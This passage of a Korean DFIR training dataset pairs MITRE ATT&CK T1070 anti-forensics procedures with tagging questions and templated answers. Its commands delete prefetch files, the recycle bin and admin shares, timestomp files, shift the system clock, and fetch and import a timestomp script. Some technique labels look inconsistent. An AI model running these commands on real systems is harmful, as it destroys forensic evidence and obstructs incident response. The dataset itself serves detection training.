함께, 삭제 대상 경로·파일 수·계정 정보 등을 수집해 이상 행위 탐지 룰에 활용한다.\n[대표 명령 예시]\nRemove-Item -Path #{folder_to_delete} -Recurse", "answer": "이 행위는 MITRE ATT&CK의 T1070.004 \"Indicator Removal on Host: File Deletion\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.004_36f96049-0ad7-4a5f-8418-460acaeb92fb_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.004 Indicator Removal on Host: File Deletion (Tactic: Defense Evasion)\n[요약] C:\\Windows\\Prefetch 디렉터리 내 .pf 프리페치 파일 1개를 삭제한다. 프리페치 삭제는 실행 흔적(어떤 프로세스가 언제 얼마나 자주 실행되었는지)을 지우는 대표적인 안티포렌식 기법이다.\n[절차] 1) 삭제 전, 현재 프리페치 파일 개수를 확인한다.    - (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count 2) 아래 PowerShell 명령을 실행해 임의의 .pf 파일 하나를 삭제한다.    - Remove-Item -Path (Get-ChildItem -Path (Join-Path $Env:SystemRoot 'prefetch') -Filter '*.pf' | Select-Object -First 1).FullName 3) 다시 프리페치 파일 개수를 확인한다.    - (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count    - 이전보다 1개 감소한 것을 확인할 수 있다. 4) 공격자 관점:    - 특정 악성 실행 파일의 프리페치 기록을 삭제해, 어떤 바이너리가 언제 실행되었는지에 대한 흔적을 숨기려 할 수 있다. 5) 방어/포렌식 관점:    - Prefetch 디렉터리에 대한 삭제 이벤트를 파일 감사/EDR로 모니터링하고, 특히 공격 시간대 전후로 비정상적인 삭제가 있는지 확인.    - 프리페치가 비정상적으로 \"없는\" 상황 자체가 IOC가 될 수 있으므로, 다른 아티팩트(MFT, Shimcache, Amcache 등)와 교차 검증해야 한다.\n[대표 명령 예시]\nRemove-Item -Path (Get-ChildItem -Path (Join-Path $Env:SystemRoot 'prefetch') -Filter '*.pf' | Select-Object -First 1).FullName", "answer": "이 행위는 MITRE ATT&CK의 T1070.004 \"Indicator Removal on Host: File Deletion\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.004_69f50a5f-967c-4327-a5bb-e1a9a9983785_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.004 Indicator Removal on Host: File Deletion (Tactic: Defense Evasion)\n[요약] TeamViewer_##.log 형식과 동일한 이름의 로그 파일을 생성한 후 즉시 삭제해, 원격 제어 도구 로그 삭제 행위를 모방한다.\n[절차] 1) 아래 명령으로 TeamViewer 로그 형식을 모방한 파일을 생성한다.    - New-Item -Path #{teamviewer_log_file} -Force | Out-Null 2) 파일이 생성되었는지 확인한다.    - Test-Path #{teamviewer_log_file} 3) 다음 명령으로 해당 로그 파일을 강제로 삭제한다.    - Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore 4) 삭제 결과 확인:    - Test-Path #{teamviewer_log_file} 실행 시 False가 반환되는지 확인. 5) 공격자 관점:    - 실제 TeamViewer_XX.log 파일을 지움으로써 원격 접속, 파일 전송, 세션 기록 등의 흔적을 숨기려 할 수 있음. 6) 방어/포렌식 관점:    - TeamViewer_##.log 패턴의 파일에 대한 삭제 이벤트를 우선적으로 모니터링하고, 삭제 직전/이후의 프로세스, 네트워크 로그를 연계 분석한다.    - 원격 접속 행위를 다른 소스(Windows Event Log, 방화벽 로그, EDR 로그 등)와 함께 상호 검증해야 한다.\n[대표 명령 예시]\nNew-Item -Path #{teamviewer_log_file} -Force | Out-Null; Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore", "answer": "이 행위는 MITRE ATT&CK의 T1070.004 \"Indicator Removal on Host: File Deletion\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.004_f723d13d-48dc-4317-9990-cf43a9ac0bf2_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.004 Indicator Removal on Host: File Deletion (Tactic: Defense Evasion)\n[요약] rd /s /q 명령을 사용해 시스템 드라이브의 $RECYCLE.BIN 폴더(휴지통)를 통째로 삭제함으로써, 휴지통에 남아 있던 삭제 파일 흔적을 제거한다.\n[절차] 1) 명령 실행 전, 휴지통에 파일을 몇 개 넣어 둔다(테스트용 텍스트 파일 등). 2) 관리 권한으로 cmd.exe를 실행한다(필요 시 '관리자 권한으로 실행'). 3) 다음 명령을 실행해 시스템 드라이브의 휴지통 디렉터리를 조용히 삭제한다.    - rd /s /q %systemdrive%\\$RECYCLE.BIN    - /s : 하위 디렉터리까지 모두 삭제    - /q : 확인 질문 없이 실행 4) 실행 후 휴지통을 열어보면 비어 있거나, Windows가 다시 초기화한 상태일 수 있다. 5) 공격자 관점:    - 중요한 파일을 삭제한 뒤 휴지통까지 비워, 사용자가 간단히 복원하지 못하게 하고 포렌식 복구 난이도를 높인다. 6) 방어/포렌식 관점:    - %systemdrive%\\$RECYCLE.BIN에 대한 rd /s /q 호출을 고위험 이벤트로 간주하고, 해당 시점의 사용자·프로세스·네트워크 행위를 집중 분석한다.    - 휴지통 삭제 이후에도 볼륨 섀도우 복사본, MFT, 저수준 복구 도구 등을 활용해 삭제 파일을 최대한 복원해야 한다.\n[대표 명령 예시]\nrd /s /q %systemdrive%\\$RECYCLE.BIN", "answer": "이 행위는 MITRE ATT&CK의 T1070.004 \"Indicator Removal on Host: File Deletion\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.005_14c38f32-6509-46d8-ab43-d53e32d2b131_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.005 Indicator Removal on Host: Network Share Connection Removal (Tactic: Defense Evasion)\n[요약] net use / net share 명령으로 임의 네트워크 공유를 추가한다. 실제 제거 테스트(T1070.005)에서 삭제 대상이 될 공유를 미리 만들어 두는 설정 단계 역할을 한다.\n[절차] 1) cmd.exe를 실행한다(필요 시 관리자 권한). 2) 네트워크 드라이브로 공유를 매핑한다(예시).    - net use c: #{share_name}    - 여기서 #{share_name}은 기본값으로 \\\\test\\share 를 사용하지만, 실제 테스트에서는 접근 가능한 공유 경로로 교체하는 것이 좋다. 3) 로컬에서 새 공유를 만들고 설명/캐시 옵션을 지정한다.    - net share test=#{share_name} /REMARK:\"test share\" /CACHE:No 4) net share 명령으로 현재 공유 목록을 확인해 'test' 공유가 생성되었는지 확인한다. 5) 공격자 관점:    - C2 서버나 임시 파일 업로드 경로를 네트워크 공유로 설정해놓고, 작업 후 공유 자체를 삭제해 흔적을 줄이는 시나리오에서 선행 단계가 될 수 있다. 6) 방어/포렌식 관점:    - net share / net use 를 통해 갑자기 생긴 의심스러운 공유 및 매핑 드라이브를 탐지하고, 해당 공유를 사용한 프로세스·사용자·접속 원격지 등을 함께 분석해야 한다.\n[대표 명령 예시]\nnet use c: #{share_name}\r\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No", "answer": "이 행위는 MITRE ATT&CK의 T1070.005 \"Indicator Removal on Host: Network Share Connection Removal\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.005_09210ad5-1ef2-4077-9ad3-7351e13e9222_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.005 Indicator Removal on Host: Network Share Connection Removal (Tactic: Defense Evasion)\n[요약] net share 명령으로 특정 공유를 /delete 옵션으로 제거한다. 공격자의 작업용 공유 흔적을 없애는 전형적인 패턴이다.\n[절차] 1) net share 명령으로 현재 공유 목록을 확인하고, 삭제할 공유 이름을 확인한다. 2) 아래 명령으로 공유를 삭제한다.    - net share #{share_name} /delete    - 실제 환경에서는 #{share_name}을 'test' 같이 공유 이름으로 지정해야 한다. 3) 다시 net share를 실행해 해당 공유가 목록에서 사라졌는지 확인한다. 4) 공격자 관점:    - 침투 이후 파일 이동/도구 업로드에 사용한 임시 공유를 공격 종료 시점에 삭제해 관리자가 추적하기 어렵게 만들 수 있다. 5) 방어/포렌식 관점:    - net share XXX /delete 이벤트를 모니터링하고, 삭제된 공유의 생성 시각·사용자·접속 대상 등을 로그에서 역추적해야 한다.    - 평소 존재하지 않던 공유가 짧은 시간만 존재했다가 삭제되는 패턴은 공격 징후로 볼 수 있다.\n[대표 명령 예시]\nnet share #{share_name} /delete", "answer": "이 행위는 MITRE ATT&CK의 T1070.005 \"Indicator Removal on Host: Network Share Connection Removal\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.005_0512d214-9512-4d22-bde7-f37e058259b3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.005 Indicator Removal on Host: Network Share Connection Removal (Tactic: Defense Evasion)\n[요약] PowerShell의 Remove-SmbShare, Remove-FileShare를 사용해 SMB/파일 공유를 제거한다. 스크립트형 공격에서 흔히 보일 수 있는 패턴이다.\n[절차] 1) PowerShell을 관리자 권한으로 실행한다(공유 삭제 권한 확보 목적). 2) 현재 공유 상태를 확인한다.    - Get-SmbShare 3) 아래 명령으로 SMB/파일 공유를 제거한다.    - Remove-SmbShare -Name #{share_name}    - Remove-FileShare -Name #{share_name}    ※ 실제 환경에서는 share_name에 'test'와 같은 공유 이름을 넣어야 하며, UNC 경로가 아닌 '이름'이라는 점을 주의. 4) 다시 Get-SmbShare 등을 실행하여 해당 공유가 삭제되었는지 확인한다. 5) 공격자 관점:    - PowerShell 스크립트 내에서 침투/확대 과정에 사용한 공유를 코드 한 줄로 정리하면서 흔적을 줄인다. 6) 방어/포렌식 관점:    - Remove-SmbShare / Remove-FileShare 호출을 Script Block Logging으로 수집하고, 삭제된 공유에 연관된 보안 이벤트(접속·복사·권한 변경 등)를 시계열로 재구성해야 한다.\n[대표 명령 예시]\nRemove-SmbShare -Name #{share_name}\r\nRemove-FileShare -Name #{share_name}", "answer": "이 행위는 MITRE ATT&CK의 T1070.005 \"Indicator Removal on Host: Network Share Connection Removal\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.005_99c657aa-ebeb-4179-a665-69288fdd12b8_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.005 Indicator Removal on Host: Network Share Connection Removal (Tactic: Defense Evasion)\n[요약] 레지스트리 AutoShareServer / AutoShareWks 값을 0으로 설정해, 부팅 시 자동으로 생성되는 관리자 공유(C$, ADMIN$ 등)를 비활성화한다. 일반적으로는 거의 하지 않는 설정이라, 존재 시 강한 의심 신호가 될 수 있다.\n[절차] 1) 관리자 권한 cmd.exe를 실행한다. 2) 다음 명령으로 관리자 공유 자동 생성 기능을 비활성화한다.    - reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f    - reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f 3) 적용을 위해 보통 재부팅 또는 LanmanServer 서비스 재시작이 필요하다. 4) 재부팅 후, net share 명령으로 C$, ADMIN$ 등이 사라졌거나 더 이상 자동 생성되지 않는지 확인한다. 5) 공격자 관점:    - 자신이 사용 중인 시스템에서 관리자가 원격으로 접근하기 어렵게 만들거나, 일반적인 상태와 다르게 만들어 탐지/감사를 교란할 수 있다. 6) 방어/포렌식 관점:    - 보안 베이스라인 상 \"관리자 공유가 존재하는 것이 정상\"인 환경에서, 해당 레지스트리 값이 0으로 바뀌어 있고 공유가 사라져 있다면 강력한 침해 지표가 된다.    - 레지스트리 변경 이벤트와 함께, 시점 전후로 실행된 프로세스·계정 등을 면밀히 조사해야 한다. 7) 복구(클린업) 시에는 테스트에 정의된 cleanup_command를 사용해 레지스트리 값을 삭제해 원래 상태로 되돌릴 수 있다.\n[대표 명령 예시]\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\r\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f", "answer": "이 행위는 MITRE ATT&CK의 T1070.005 \"Indicator Removal on Host: Network Share Connection Removal\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.005_4299eff5-90f1-4446-b2f3-7f4f5cfd5d62_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.005 Indicator Removal on Host: Network Share Connection Removal (Tactic: Defense Evasion)\n[요약] for 루프를 사용해 C$, IPC$, ADMIN$ 관리자 공유를 net share <이름> /delete 로 일괄 제거한다. 랜섬웨어/침해 이후 흔적 제거 및 관리 방해 목적으로 사용된 사례가 있다.\n[절차] 1) 관리자 권한 cmd.exe를 실행한다. 2) 현재 네트워크 공유 상태를 확인한다.    - net share    - C$, ADMIN$, IPC$ 등이 존재하는지 확인. 3) 아래 명령을 실행해 관리자 공유를 한 번에 삭제한다.    - for %i in (C$ IPC$ ADMIN$) do net share %i /delete 4) 다시 net share를 실행해 위 3개 공유가 목록에서 사라졌는지 확인한다. 5) 공격자 관점:    - 디지털 포렌식에서 자주 사용하는 C$ 관리 공유를 없애면, 사고 대응자가 원격으로 디스크에 접근하기 어려워지고, 일반적인 상태와 다른 구성으로 혼란을 줄 수 있다. 6) 방어/포렌식 관점:    - 관리자 공유가 사라진 것 자체가 비정상 징후이며, 특히 랜섬웨어/APT 캠페인에서 보고된 행동과 유사하다.    - net share C$ /delete 같은 이벤트를 고위험 경보로 설정하고, 그 직전/직후의 프로세스 트리와 계정 활동을 우선적으로 조사해야 한다. 7) 복구(클린업):    - 테스트 정의된 cleanup_command를 활용해 관리자 공유를 재생성할 수 있다.      - net share ADMIN$ /UNLIMITED >nul 2>&1      - net share C$=C:\\ >nul 2>&1      - net share IPC$ >nul 2>&1\n[대표 명령 예시]\nfor %i in (C$ IPC$ ADMIN$) do net share %i /delete", "answer": "이 행위는 MITRE ATT&CK의 T1070.005 \"Indicator Removal on Host: Network Share Connection Removal\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.006_b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.006 Indicator Removal on Host: Timestomp (Tactic: Defense Evasion)\n[요약] 지정한 파일의 \"생성 시간(CreationTime)\"을 임의의 과거 시간(예: 1970-01-01 00:00:00)으로 변경해, 실제 생성 시점을 숨기는 타임스톰프 기법을 모사한다.\n[절차] 1) PowerShell을 실행한다(테스트용 파일이 있는 경로를 미리 확인). 2) 사전 준비 단계에서 정의된 dependency를 통해 대상 파일을 생성한다.    - New-Item -Path \"#{file_path}\" -Force | Out-Null    - Set-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null 3) 아래 명령으로 대상 파일의 생성 시간을 지정한 날짜/시간으로 변경한다.    - Get-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" } 4) 파일 탐색기에서 해당 파일 → 우클릭 → 속성(Properties)을 열고, \"만든 날짜(Created)\"가 1970년 등 지정한 시간으로 변경되었는지 확인한다. 5) 공격자 관점:    - 악성 파일이 실제로는 최근에 생성되었지만, 수년 전으로 생성 시간을 조작해 타임라인 분석에서 눈에 띄지 않게 만들 수 있다. 6) 방어/포렌식 관점:    - 파일 메타데이터(생성/수정/접근 시간) 간 불일치, $MFT, $LogFile, Prefetch 등 다른 아티팩트와의 타임라인 비교를 통해 조작 흔적을 찾을 수 있다.\n[대표 명령 예시]\nGet-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" }", "answer": "이 행위는 MITRE ATT&CK의 T1070.006 \"Indicator Removal on Host: Timestomp\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.006_f8f6634d-93e1-4238-8510-f8a90a20dcf2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.006 Indicator Removal on Host: Timestomp (Tactic: Defense Evasion)\n[요약] 지정한 파일의 \"마지막 수정 시간(LastWriteTime)\"을 과거 시간으로 변경해, 실제 변경 시점을 숨기거나 다른 파일과 타임라인을 맞춘다.\n[절차] 1) PowerShell에서 dependency 단계로 테스트용 파일을 만든다.    - New-Item -Path \"#{file_path}\" -Force | Out-Null    - Set-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null 2) 아래 명령으로 마지막 수정 시간을 지정한 값으로 변경한다.    - Get-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" } 3) 파일 속성에서 \"수정한 날짜(Modified)\"가 1970년 등 지정한 시간으로 변경되었는지 확인한다. 4) 공격자 관점:    - 특정 시점 이후 생성·수정된 파일만 필터링하는 탐지 로직을 우회할 수 있다. 5) 방어/포렌식 관점:    - 파일 내용/해시 변경 시점과 LastWriteTime이 맞지 않거나, 다른 로그(Event Log, ShimCache, AmCache 등)와 타임라인이 어긋나는 경우 타임스톰프 의심 지표가 된다.\n[대표 명령 예시]\nGet-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" }", "answer": "이 행위는 MITRE ATT&CK의 T1070.006 \"Indicator Removal on Host: Timestomp\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.006_da627f63-b9bd-4431-b6f8-c5b44d061a62_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.006 Indicator Removal on Host: Timestomp (Tactic: Defense Evasion)\n[요약] 지정한 파일의 \"마지막 액세스 시간(LastAccessTime)\"을 임의 시간으로 설정해, 실제로 언제 열렸는지 추적하기 어렵게 만든다.\n[절차] 1) PowerShell에서 테스트용 파일을 생성한다.    - New-Item -Path \"#{file_path}\" -Force | Out-Null    - Set-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null 2) 아래 명령으로 마지막 액세스 시간을 변경한다.    - Get-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" } 3) 파일 속성에서 \"액세스한 날짜(Accessed)\"가 지정한 시간으로 바뀌었는지 확인한다. 4) 공격자 관점:    - 실제로 최근에 파일을 열어도, 오래전에 마지막으로 본 것처럼 보이게 해 분석 시점을 흐릴 수 있다. 5) 방어/포렌식 관점:    - LastAccessTime만 비정상적으로 과거이거나, 다른 타임스탬프(생성/수정, $MFT 기록 등)와 어울리지 않는 경우 타임스톰프 의심 신호로 볼 수 있다.\n[대표 명령 예시]\nGet-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" }", "answer": "이 행위는 MITRE ATT&CK의 T1070.006 \"Indicator Removal on Host: Timestomp\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.006_d7512c33-3a75-4806-9893-69abc3ccdd43_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.006 Indicator Removal on Host: Timestomp (Tactic: Defense Evasion)\n[요약] MITRE APT29 에뮬레이션에서 사용된 timestomp.ps1 스크립트를 가져와 kxwn.lock 파일에 적용하는 실제 타임스톰프 시나리오를 재현한다.\n[절차] 1) PowerShell을 관리자 또는 충분한 권한으로 실행한다. 2) dependency 단계 실행:    - timestomp.ps1 다운로드:      Invoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/.../timestomp.ps1\" -OutFile \"#{file_path}\\timestomp.ps1\"    - kxwn.lock 생성:      New-Item -Path \"#{file_path}\\kxwn.lock\" -ItemType File 3) 타임스톰프 모듈을 임포트한다.    - Import-Module \"#{file_path}\\timestomp.ps1\" 4) 대상 파일(kxwn.lock)에 타임스톰프를 적용한다.    - timestomp -dest \"#{file_path}\\kxwn.lock\" 5) 파일 속성 또는 PowerShell(Get-Item)을 통해 생성/수정/접근 시간이 어떻게 변경되었는지 확인한다. 6) 공격자 관점:    - 공개된 공격 도구(timestomp.ps1)를 그대로 활용해 공격 흔적 파일의 타임라인을 위장할 수 있다. 7) 방어/포렌식 관점:    - kxwn.lock처럼 특정 이름/확장자의 파일이 비정상적인 시간대에 생성되고, 그 직후 타임스탬프가 한 번에 변경되는 패턴을 탐지하는 룰을 만들 수 있다.    - 타임라인 분석 시 $MFT, $LogFile, 이벤트 로그 등 다른 출처의 시간과 교차 검증이 필수적이다.\n[대표 명령 예시]\nimport-module \"#{file_path}\\timestomp.ps1\"\r\ntimestomp -dest \"#{file_path}\\kxwn.lock\"", "answer": "이 행위는 MITRE ATT&CK의 T1070.006 \"Indicator Removal on Host: Timestomp\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.006_7bcf83bf-f5ef-425c-9d9a-71618ad9ed12_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.006 Indicator Removal on Host: Timestomp (Tactic: Defense Evasion)\n[요약] Set-Date를 이용해 시스템 시간을 앞/뒤로 이동시켜(Event Log, 파일 타임스탬프 등) 전체 타임라인을 왜곡하는 기법을 시뮬레이션한다. slipDays.bak에 변경 일수를 기록했다가 cleanup에서 복귀한다.\n[절차] 1) 관리자 권한 PowerShell을 실행한다. 2) days_to_modify 입력값(기본 3일)을 확인한다. 양수면 미래로, 음수면 과거로 시간을 이동시키는 느낌으로 활용 가능하다. 3) 아래 명령(Atomic executor)을 실행한다.    try {      Set-Date -Date (Get-Date).AddDays(#{days_to_modify})      Add-Content \"$env:APPDATA\\slipDays.bak\" #{days_to_modify}    } catch { exit 1 } 4) Get-Date, 시스템 트레이 시계, Event Viewer 로그 등에서 시간이 실제로 이동했는지 확인한다. 5) 이 상태에서 생성되는 로그·파일의 타임스탬프가 변경된 시스템 시간을 기준으로 기록되기 때문에, 실제 사건 발생 시각과 로그 상 시각이 불일치하게 된다. 6) cleanup 단계에서 slipDays.bak을 읽어 원래 날짜로 되돌린다.    - if (Test-Path \"$env:APPDATA\\slipDays.bak\") {        foreach ($line in (Get-Content $env:APPDATA\\slipDays.bak)) {          Set-Date -Date (Get-Date).AddDays(-$line)        }        rm \"$env:APPDATA\\slipDays.bak\"      } 7) 공격자 관점:    - 특정 기간의 로그를 \"시간을 당겨서\" 만들거나, 실제 공격 시점보다 과거/미래로 사건을 밀어 forensic 타임라인을 혼란스럽게 할 수 있다. 8) 방어/포렌식 관점:    - 시스템 시간 변경 이벤트(Security/System 로그, W32Time 관련 로그 등)를 모니터링하고, 시간 변경 전후의 모든 행위를 우선 조사 대상으로 삼아야 한다.    - 여러 호스트/도메인 컨트롤러/네트워크 장비의 로그를 상호 비교해, 이상한 시간대의 로그를 교차 검증하는 것이 중요하다.\n[대표 명령 예시]\ntry{ \r\n  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})\r\n  Add-Content \"$env:APPDATA\\slipDays.bak\" #{days_to_modify}\r\n}\r\ncatch {exit 1}", "answer": "이 행위는 MITRE ATT&CK의 T1070.006 \"Indicator Removal on Host: Timestomp\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.008_d29f01ea-ac72-4efc-8a15-bea64b77fabf_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.008 Email Collection: Mailbox Manipulation (Tactic: Collection / Defense Evasion)\n[요약] Windows 메일 저장소(Unistore) 하위 데이터를 copy 폴더로 통째로 복사한 뒤, 해당 copy 폴더를 삭제하여 메일박스 데이터 복사 후 흔적 제거를 시뮬레이션한다.\n[절차] 1) 관리자 권한 PowerShell을 실행한다. 2) 우선 메일 저장소 경로를 확인한다.    - `C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data` 3) 아래 명령을 실행해 data 하위에 copy 폴더를 생성하고, 원본 데이터를 copy 폴더로 복사한 뒤 copy 폴더를 삭제한다.    - New-Item으로 copy 폴더 생성(이미 있으면 무시).    - Get-ChildItem으로 data 하위의 모든 항목을 나열하되, copy 폴더는 제외( -Exclude copy ).    - 각 항목을 Copy-Item으로 copy 폴더에 재귀 복사.    - 마지막에 Remove-Item으로 copy 폴더 전체를 삭제한다. 4) 실행 후 Unistore\\data 경로를 살펴보면 copy 폴더가 남아 있지 않아야 한다. 5) 공격자 관점:    - 메일박스를 다른 위치로 먼저 복사해 가져간 뒤, 복사 흔적(임시 폴더·파일)을 삭제해 포렌식 분석 시 탐지 난이도를 높일 수 있다. 6) 방어/포렌식 관점:    - 짧은 시간 동안 대량 파일 복사 + 임시 폴더 생성/삭제 패턴을 감시하고, 특히 Unistore·Outlook PST/OST 경로 등에 대한 비정상적인 대량 I/O를 모니터링하는 탐지 규칙을 설계할 수 있다.\n[대표 명령 예시]\nNew-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\r\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\r\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore", "answer": "이 행위는 MITRE ATT&CK의 T1070.008 \"Email Collection: Mailbox Manipulation\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection / Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
